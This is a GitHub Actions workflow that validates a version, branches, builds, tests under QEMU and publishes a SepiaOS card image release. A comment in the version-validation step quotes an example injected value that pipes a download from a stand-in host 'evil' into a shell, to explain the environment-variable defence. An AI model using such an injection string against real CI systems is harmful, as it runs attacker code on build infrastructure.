name: Release

# Cuts a release of the SepiaOS card image. Manual on purpose: the version is a
# human decision, so the person releasing types it in.
#
# main is branched into rel-<version> and everything after that happens on that
# branch - the build, the tests and the tag. So a release is reproducible from
# a branch that exists afterwards, and main can move on underneath it without
# changing what was released.
#
# Creating that branch is a push, so ci.yml runs on it too. That is a duplicate
# of the tests this workflow runs, and it is left alone: it runs concurrently
# and delays nothing, and "every branch is built" is the rule the README asks
# for without an exception carved into it.
on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Version to release, e.g. 0.1.0 or 2026.08.28 (a leading "v" is added if missing)'
        required: true
        type: string
      prerelease:
        description: 'Mark as a pre-release. This also decides which boot partition is used: a pre-release build takes the latest pre-release of Sepia-OS/boot, a full release takes the latest full release. It does NOT select an LLVM toolchain, a GNU make or an e2fsprogs - see llvm_tag, make_tag and e2fsprogs_tag.'
        required: false
        default: true
        type: boolean
      boot_tag:
        description: 'Pin a specific Sepia-OS/boot release instead of taking the latest one on that channel (optional)'
        required: false
        default: ''
        type: string
      llvm_tag:
        description: 'Pin a specific Sepia-OS/llvm release instead of taking the newest one (optional). Note that llvm keeps only its newest release and deletes older tags, so a pin can stop resolving.'
        required: false
        default: ''
        type: string
      make_tag:
        description: 'Pin a specific Sepia-OS/make release instead of taking the newest one (optional). Unlike llvm, that repository keeps its releases, so a pin here goes on resolving.'
        required: false
        default: ''
        type: string
      e2fsprogs_tag:
        description: 'Pin a specific Sepia-OS/e2fsprogs release instead of taking the newest one (optional). Like make, that repository keeps its releases, so a pin here goes on resolving.'
        required: false
        default: ''
        type: string
      musl_tag:
        description: 'Pin a specific Sepia-OS/musl release instead of taking the newest one (optional). This is the libc everything else on the card runs on.'
        required: false
        default: ''
        type: string
      wifi_tag:
        description: 'Pin a specific Sepia-OS/wifi release (libnl and wpa_supplicant) instead of taking the newest one (optional).'
        required: false
        default: ''
        type: string

# One release at a time, and never cancelled halfway: a half-finished publish
# would leave a branch, a tag or a release behind with nothing on it.
concurrency:
  group: release
  cancel-in-progress: false

permissions:
  contents: read

jobs:
  # -------------------------------------------------------------------------
  # Everything that can say "no" happens here, before the half-hour build: the
  # version is validated, and the branch, tag and release are all checked for
  # collisions. Cheap, and it fails in seconds rather than after a full build.
  # -------------------------------------------------------------------------
  gate:
    name: check the version, then branch main
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
    outputs:
      version: ${{ steps.version.outputs.version }}
      tag: ${{ steps.version.outputs.tag }}
      branch: ${{ steps.version.outputs.branch }}
      asset: ${{ steps.version.outputs.asset }}
      sha: ${{ steps.branch.outputs.sha }}
    steps:
      # `inputs.version` is attacker-controlled text. It goes through the
      # environment rather than being interpolated into the script, because
      # `${{ }}` is substituted before bash ever sees the line - a version of
      # `x"; curl evil | sh; #` would otherwise run.
      - name: Validate the version
        id: version
        env:
          VERSION: ${{ inputs.version }}
        run: |
          # Trim the ends only. Deleting all whitespace would quietly turn a
          # fat-fingered "1.0 0" into "1.00" and release the wrong version;
          # internal whitespace has to reach the pattern below and be rejected.
          version="$VERSION"
          version="${version#"${version%%[![:space:]]*}"}"
          version="${version%"${version##*[![:space:]]}"}"
          version="${version#v}"
          # Must start with a digit and stay inside what git accepts as a branch
          # and a tag, and what a filename can carry.
          if [[ ! "$version" =~ ^[0-9][0-9A-Za-z.+-]*$ ]]; then
            echo "::error title=Bad version::'${VERSION}' is not a version." \
                 "Expected something like 0.1.0, 2026.08.28 or 1.0.0-rc1," \
                 "optionally with a leading v."
            exit 1
          fi
          {
            echo "version=${version}"
            echo "tag=v${version}"
            echo "branch=rel-${version}"
            echo "asset=sepiaos-v${version}.img.xz"
          } >> "$GITHUB_OUTPUT"

      - name: Refuse to overwrite an existing release, tag or branch
        env:
          GH_TOKEN: ${{ github.token }}
          TAG: ${{ steps.version.outputs.tag }}
          BRANCH: ${{ steps.version.outputs.branch }}
        run: |
          if gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
            echo "::error title=${TAG} already released::Pick a different version," \
                 "or delete the old release first: gh release delete ${TAG} --cleanup-tag"
            exit 1
          fi
          # Asked over the API rather than with git ls-remote: this job has no
          # checkout, so there is no repository for git to read an origin from.
          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/${TAG}" >/dev/null 2>&1; then
            echo "::error title=${TAG} already tagged::The tag exists without a release." \
                 "Delete it (git push --delete origin ${TAG}) or pick a different version."
            exit 1
          fi
          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/${BRANCH}" >/dev/null 2>&1; then
            echo "::error title=${BRANCH} already exists::A release branch for this" \
                 "version is already there. Delete it or pick a different version."
            exit 1
          fi

      # The branch is created before the build rather than after it, because
      # the build has to run *on* the release branch: that is what makes the
      # released commit a thing that still exists afterwards, whatever main does
      # next. It is created from main's head at this moment, not from whatever
      # ref this workflow was dispatched on.
      - name: Branch main into the release branch
        id: branch
        env:
          GH_TOKEN: ${{ github.token }}
          BRANCH: ${{ steps.version.outputs.branch }}
        run: |
          sha="$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/main" --jq '.object.sha')"
          [ -n "$sha" ] || { echo "::error::could not read the head of main"; exit 1; }
          gh api --method POST "repos/${GITHUB_REPOSITORY}/git/refs" \
            -f "ref=refs/heads/${BRANCH}" -f "sha=${sha}" >/dev/null
          echo "sha=${sha}" >> "$GITHUB_OUTPUT"
          echo "Branched main (${sha}) into ${BRANCH}"

  # -------------------------------------------------------------------------
  # Built and tested on the release branch, in the same container CI uses. The
  # tests are not a formality here: a release that cannot boot is worse than no
  # release, and this is the last point at which nothing has been published.
  # -------------------------------------------------------------------------
  build:
    name: build and test the release
    needs: gate
    runs-on: ubuntu-latest
    timeout-minutes: 120
    container: debian:trixie-slim
    outputs:
      boot_release: ${{ steps.facts.outputs.boot_release }}
      firmware: ${{ steps.facts.outputs.firmware }}
      kernels: ${{ steps.facts.outputs.kernels }}
      musl: ${{ steps.facts.outputs.musl }}
      musl_release: ${{ steps.facts.outputs.musl_release }}
      wpa: ${{ steps.facts.outputs.wpa }}
      wifi_release: ${{ steps.facts.outputs.wifi_release }}
      llvm: ${{ steps.facts.outputs.llvm }}
      llvm_release: ${{ steps.facts.outputs.llvm_release }}
      gnu_make: ${{ steps.facts.outputs.gnu_make }}
      make_release: ${{ steps.facts.outputs.make_release }}
      e2fsprogs: ${{ steps.facts.outputs.e2fsprogs }}
      e2fsprogs_release: ${{ steps.facts.outputs.e2fsprogs_release }}
    env:
      QEMU_TIMEOUT: 300
      SEPIAOS_VERSION: ${{ needs.gate.outputs.version }}
      # What the login banner shows. The GitHub release version, with " (pre)"
      # appended when this is a pre-release, so the running system says what it
      # is. Kept apart from SEPIAOS_VERSION because that one also names the image
      # file and fills VERSION_ID, which cannot hold a space or a bracket.
      SEPIAOS_VERSION_DISPLAY: "${{ needs.gate.outputs.version }}${{ inputs.prerelease && ' (pre)' || '' }}"
      # A release build takes the latest full release of the boot partition, a
      # pre-release build the latest pre-release. Implemented literally, so a
      # release never quietly ships a pre-release boot partition. Note that
      # Sepia-OS/boot must actually have a full release for the former to work.
      CHANNEL: ${{ inputs.prerelease && 'prerelease' || 'release' }}
      BOOT_TAG: ${{ inputs.boot_tag }}
      # The on-device clang and lld come from Sepia-OS/llvm, and deliberately
      # not through CHANNEL. That repository keeps exactly one release at a
      # time - publishing deletes every earlier release and its tag - so there
      # is no pre-release line and no release line to choose between, only the
      # one thing it currently has. Feeding the prerelease input through would
      # make the default dispatch fail with "has no published pre-release", and
      # inverting it would fail the other way the day llvm cuts one. So the
      # Makefile takes the newest published release whatever its flag, and this
      # is only the pin. WITH_LLVM is not set here on purpose: the Makefile
      # defaults it on, so the release ships exactly the card CI boots.
      LLVM_TAG: ${{ inputs.llvm_tag }}
      # GNU make for the device, from Sepia-OS/make, and not through CHANNEL
      # either - it has cut a full release, so a pre-release dispatch would
      # otherwise fail looking for a pre-release line that does not exist. The
      # difference from llvm is that this repository keeps its releases and
      # refuses to reuse a version, so a pin here does not decay. WITH_MAKE is
      # likewise left at its default for the same reason WITH_LLVM is: the
      # released card has to be the card CI builds and boots.
      MAKE_TAG: ${{ inputs.make_tag }}
      # musl, from Sepia-OS/musl. Not through CHANNEL for the same reason as
      # the other three, and with no WITH_ switch to leave it out: there is no
      # card without a libc. This is the one pin that decides what every other
      # binary in the image runs on, which is why the release notes name both
      # the version and the release it came from.
      MUSL_TAG: ${{ inputs.musl_tag }}
      # libnl and wpa_supplicant, from Sepia-OS/wifi. WITH_WIFI is left at its
      # default for the same reason WITH_LLVM is: the released card has to be
      # the card CI builds and boots. The Broadcom firmware is still fetched by
      # this repository and follows BRCM_VERSION, not this pin.
      WIFI_TAG: ${{ inputs.wifi_tag }}
      # The filesystem tools, from Sepia-OS/e2fsprogs, on exactly the same
      # terms as GNU make: not through CHANNEL, a pin that does not decay, and
      # WITH_E2FSPROGS left at its default so the released card is the card CI
      # builds and boots. This one also decides where the card's resize2fs
      # comes from - the package, or the single binary the Makefile
      # cross-builds when it is off - and the first boot cannot grow the root
      # filesystem without one of them.
      E2FSPROGS_TAG: ${{ inputs.e2fsprogs_tag }}
      # The Makefile asks api.github.com which boot release to build against.
      # Unauthenticated that is 60 requests an hour *per IP*, and hosted
      # runners share their egress addresses with every other job on the
      # platform, so the budget is routinely already spent by someone else -
      # the build then dies two minutes in, right after busybox, with
      # "GitHub API rate limit hit". The automatic per-run token raises it to
      # 1000 an hour for this repository.
      GITHUB_TOKEN: ${{ github.token }}
    steps:
      - name: Install build tools
        run: |
          apt-get update -qq
          apt-get install -y -qq --no-install-recommends \
            build-essential make git curl ca-certificates \
            jq xz-utils bzip2 zstd mtools qemu-system-arm python3 squashfs-tools

      - uses: actions/checkout@v5
        with:
          ref: ${{ needs.gate.outputs.branch }}

      - name: Cache the downloaded upstream artifacts
        uses: actions/cache@v4
        with:
          path: downloads
          key: downloads-${{ runner.os }}-${{ hashFiles('Makefile') }}
          restore-keys: downloads-${{ runner.os }}-

      # Ahead of `make image` on purpose, even though that would fetch it
      # anyway. The toolchain is a prerequisite of the rootfs staging, which is
      # the last thing the image build does, so a mistyped llvm_tag would
      # otherwise surface forty minutes in - after musl, busybox, the modules
      # and the wireless stack have all been built. This is the same documented
      # target the build reaches later; it just reaches it in seconds.
      # First, because nothing else can be built without a libc: a mistyped
      # musl_tag should stop this in seconds rather than after the whole rootfs
      # has been built.
      - name: Resolve and fetch musl
        run: make musl

      - name: Resolve and fetch the wifi package
        run: make wifi

      - name: Resolve and fetch the on-device toolchain
        run: make llvm

      # Same again, and for the same reason: a mistyped make_tag should stop
      # this in seconds rather than after the whole rootfs has been built.
      - name: Resolve and fetch GNU make for the device
        run: make fetch-make

      # And once more for the filesystem tools.
      - name: Resolve and fetch e2fsprogs for the device
        run: make e2fsprogs

      - name: Build the image
        run: make image

      - name: Read the image back
        run: make image-check

      # The library closure of the shipped clang and lld, against what the card
      # actually carries. It needs the cross-toolchain's readelf, so it is off
      # the build path and asked for here rather than being part of `make llvm`.
      - name: Read the toolchain back
        run: make llvm-check

      # One binary, so one claim: aarch64, on the musl loader, with libc.so as
      # its only shared library. Needs the cross-toolchain's readelf as well.
      - name: Read GNU make back
        run: make make-check

      # Twenty-two programs, all of them read rather than a sample.
      - name: Read e2fsprogs back
        run: make e2fsprogs-check

      - name: Boot it as every board QEMU can emulate
        run: make smoke

      - name: Check the first-boot resize
        run: make grow-check

      # What the release notes say about the image is read out of the image
      # rather than written by hand, so it cannot drift from what was built.
      - name: Collect what went into it
        id: facts
        run: |
          . build/rootfs/etc/os-release
          {
            echo "boot_release=${SEPIAOS_BOOT_RELEASE}"
            echo "firmware=${SEPIAOS_FIRMWARE}"
            echo "kernels=${SEPIAOS_KERNELS}"
            echo "musl=${SEPIAOS_MUSL}"
            echo "musl_release=${SEPIAOS_MUSL_RELEASE}"
            echo "wpa=${SEPIAOS_WPA_SUPPLICANT}"
            echo "wifi_release=${SEPIAOS_WIFI_RELEASE}"
            echo "llvm=${SEPIAOS_LLVM}"
            echo "llvm_release=${SEPIAOS_LLVM_RELEASE}"
            echo "gnu_make=${SEPIAOS_MAKE}"
            echo "make_release=${SEPIAOS_MAKE_RELEASE}"
            echo "e2fsprogs=${SEPIAOS_E2FSPROGS}"
            echo "e2fsprogs_release=${SEPIAOS_E2FSPROGS_RELEASE}"
            echo "image=$(make -s print-IMAGE)"
          } >> "$GITHUB_OUTPUT"

      # -T0 uses every core; the checksum is taken afterwards, so the threaded
      # encoder's different framing does not matter. The image is mostly empty
      # space and compresses to a fraction of its 256 MiB.
      - name: Compress and checksum
        env:
          ASSET: ${{ needs.gate.outputs.asset }}
          IMAGE: ${{ steps.facts.outputs.image }}
        run: |
          mkdir -p dist
          xz -9 -T0 -c "$IMAGE" > "dist/${ASSET}"
          cd dist && sha256sum "${ASSET}" > SHA256SUMS
          cat SHA256SUMS
          ls -lh

      # compression-level 0: the payload is already xz -9, so zipping it again
      # only burns CPU.
      - uses: actions/upload-artifact@v5
        with:
          name: release-assets
          path: dist/
          compression-level: 0
          if-no-files-found: error


  # -------------------------------------------------------------------------
  # Publishing is a separate job purely so it can run on the bare runner, where
  # `gh` is preinstalled: Debian does not package the GitHub CLI, so doing this
  # in the build container would mean a third-party action or hand-rolled REST
  # calls.
  #
  # `gh release create --target` creates the tag as part of the release, so the
  # "tag exists but the release does not" half-state cannot happen. GitHub
  # attaches the source archives of that tag to the release by itself, which is
  # the "with the sources" half of the requirement.
  #
  # This job sits with no output for a long time uploading the asset, which is
  # measured rather than a hang - and the measurement moved when the toolchain
  # went in: the card is 512 MiB instead of 256 and the compressed asset is
  # roughly 100 MiB instead of 21, so the timeout is 60 rather than 30.
  # -------------------------------------------------------------------------
  publish:
    name: publish the release
    needs: [gate, build]
    runs-on: ubuntu-latest
    timeout-minutes: 60
    permissions:
      contents: write
    steps:
      - uses: actions/download-artifact@v5
        with:
          name: release-assets
          path: dist

      - name: Create the release
        env:
          GH_TOKEN: ${{ github.token }}
          TAG: ${{ needs.gate.outputs.tag }}
          BRANCH: ${{ needs.gate.outputs.branch }}
          ASSET: ${{ needs.gate.outputs.asset }}
          SHA: ${{ needs.gate.outputs.sha }}
          BOOT_RELEASE: ${{ needs.build.outputs.boot_release }}
          FIRMWARE: ${{ needs.build.outputs.firmware }}
          KERNELS: ${{ needs.build.outputs.kernels }}
          MUSL: ${{ needs.build.outputs.musl }}
          MUSL_RELEASE: ${{ needs.build.outputs.musl_release }}
          WPA: ${{ needs.build.outputs.wpa }}
          WIFI_RELEASE: ${{ needs.build.outputs.wifi_release }}
          LLVM: ${{ needs.build.outputs.llvm }}
          LLVM_RELEASE: ${{ needs.build.outputs.llvm_release }}
          # Not MAKE: that name is GNU make's own, and exporting it into a
          # shell that later runs make would point $(MAKE) at a version number.
          GNU_MAKE: ${{ needs.build.outputs.gnu_make }}
          MAKE_RELEASE: ${{ needs.build.outputs.make_release }}
          E2FSPROGS: ${{ needs.build.outputs.e2fsprogs }}
          E2FSPROGS_RELEASE: ${{ needs.build.outputs.e2fsprogs_release }}
          PRERELEASE: ${{ inputs.prerelease }}
        run: |
          cat > notes.md <<EOF
          A complete SepiaOS card for Pi Zero 2 W, Pi 3, Pi 4, CM4, Pi 5 and
          CM5: the boot partition, and a root filesystem of musl and busybox
          with the kernel modules that match the shipped kernel — an LLVM
          toolchain with GNU make beside it, so the card builds for itself, and
          the e2fsprogs tools, so it can look after its own filesystems.

          | | |
          |---|---|
          | Branch | \`${BRANCH}\` |
          | Commit | \`${SHA}\` |
          | Boot partition | \`${BOOT_RELEASE}\` |
          | Raspberry Pi firmware | \`${FIRMWARE}\` |
          | Kernels | \`${KERNELS}\` |
          | musl | \`${MUSL}\` (\`${MUSL_RELEASE}\` from \`Sepia-OS/musl\`) |
          | wpa_supplicant | \`${WPA}\` (\`${WIFI_RELEASE}\` from \`Sepia-OS/wifi\`) |
          | LLVM | \`${LLVM}\` (\`${LLVM_RELEASE}\` from \`Sepia-OS/llvm\`) |
          | GNU make | \`${GNU_MAKE}\` (\`${MAKE_RELEASE}\` from \`Sepia-OS/make\`) |
          | e2fsprogs | \`${E2FSPROGS}\` (\`${E2FSPROGS_RELEASE}\` from \`Sepia-OS/e2fsprogs\`) |

          Booted to a login prompt under QEMU as a Pi Zero 2 W, a Pi 3, a Pi 4
          and a CM4 before publishing.

          ## Building on the card

          \`clang\`, \`clang++\`, \`lld\` and the LLVM binutils equivalents are in
          \`/usr/bin\`, with libc++, libc++abi, libunwind, compiler-rt's builtins
          and the GNUstep Objective-C runtime beside them. musl's headers and
          its link-time objects are on the card too, which is what makes
          \`clang hello.c\` work rather than only \`clang -c\`, and
          \`/usr/bin/ld\` points at \`lld\` so the driver's default linker name
          resolves. Clang defaults to compiler-rt, libc++ and libunwind through
          a configuration file in \`/usr/lib/clang-config\`, so no flags are
          needed.

          **GNU make \`${GNU_MAKE}\` is at \`/usr/bin/make\`**, from
          \`Sepia-OS/make\` — the same cross-build against the same musl, so it
          runs against the libc that is already on the card. That is the piece
          that makes an ordinary \`Makefile\` work on the device rather than
          only a single \`clang\` command line, and it is the last thing needed
          to build a project here rather than compile a file. Its GPLv3 licence
          text ships with it, at \`/usr/share/licenses/make/COPYING\`.

          ## Filesystem tools

          **e2fsprogs \`${E2FSPROGS}\`** is on the card, from
          \`Sepia-OS/e2fsprogs\` — the whole package rather than the single
          \`resize2fs\` earlier images carried. \`mke2fs\`, \`e2fsck\`,
          \`tune2fs\`, \`resize2fs\`, \`debugfs\`, \`dumpe2fs\`,
          \`badblocks\`, \`blkid\`, \`fsck\` and \`e2image\` are in
          \`/sbin\`, with \`filefrag\`, \`e2freefrag\`, \`e4defrag\`,
          \`uuidd\` and the rest under \`/usr\`, the usual
          \`mkfs.ext4\`/\`fsck.ext4\`/\`e2label\` names beside them, and
          \`/etc/mke2fs.conf\`. Six of those names were busybox applets and
          are now the real programs; busybox's own \`chattr\` and \`lsattr\`
          in \`/bin\` still take precedence on \`PATH\` over the e2fsprogs
          ones in \`/usr/bin\`. This is also what grows the root filesystem on
          first boot. Its licences ship with it, at
          \`/usr/share/licenses/e2fsprogs/\`.

          **Two honest caveats.** First, nothing has run \`clang\` or \`make\`
          on this card: QEMU's serial console is output-only, so what CI checks
          is that every shipped binary is aarch64, asks for the musl loader, and
          has its shared-library dependencies satisfied. That is a layout proof,
          not a behavioural one. Second, every shared library these binaries name
          is satisfied on this card, which CI asserts — but that is a statement
          about the dynamic linker, not about the compiler working.

          ## Logging in

          Log in as \`root\` with the password \`sepiaos\`. It is good for
          exactly one login: the first thing the shell does is make you choose
          a new one.

          ## First boot

          The image is small on purpose. On its first boot it grows the root
          filesystem to fill the card, adds a swap partition (1, 2 or 4 GiB
          depending on the card's size) and reboots once - so the first boot
          takes a little longer than the ones after it.

          ## Flashing

          Verify the download, then write it - on Linux:

          \`\`\`sh
          sha256sum -c SHA256SUMS
          xz -d ${ASSET}
          sudo dd if=${ASSET%.xz} of=/dev/sdX bs=4M conv=fsync status=progress
          \`\`\`

          On macOS the device is \`/dev/rdiskN\` and the block size is spelled
          \`bs=4m\`; \`shasum -a 256 -c SHA256SUMS\` replaces \`sha256sum\`.

          The sources this was built from are the archives below, and the
          \`${BRANCH}\` branch.
          EOF

          if [ "$PRERELEASE" = "true" ]; then
            flag=(--prerelease)
          else
            flag=(--latest)
          fi

          gh release create "$TAG" \
            --repo "$GITHUB_REPOSITORY" \
            --target "$BRANCH" \
            --title "SepiaOS $TAG" \
            --notes-file notes.md \
            "${flag[@]}" \
            "dist/$ASSET" \
            dist/SHA256SUMS

  # -------------------------------------------------------------------------
  # The branch is created before the build, so a build that fails leaves one
  # behind - and the gate then refuses the retry, because the branch already
  # exists. It holds nothing that main does not: it was created seconds earlier
  # as a pointer to main's head, and nothing commits to it. So it is removed
  # again, and the same version can be released once the reason it failed is
  # fixed. The tag and the release are never reached on this path.
  # -------------------------------------------------------------------------
  rollback:
    name: remove the release branch again
    needs: [gate, build]
    if: failure() && needs.gate.result == 'success'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
    steps:
      - name: Delete the release branch
        env:
          GH_TOKEN: ${{ github.token }}
          BRANCH: ${{ needs.gate.outputs.branch }}
        run: |
          if gh api --method DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/${BRANCH}"; then
            echo "::notice title=Rolled back::${BRANCH} was deleted; the release can be retried."
          else
            echo "::warning title=Branch left behind::${BRANCH} could not be deleted." \
                 "Delete it by hand before retrying this version."
          fi
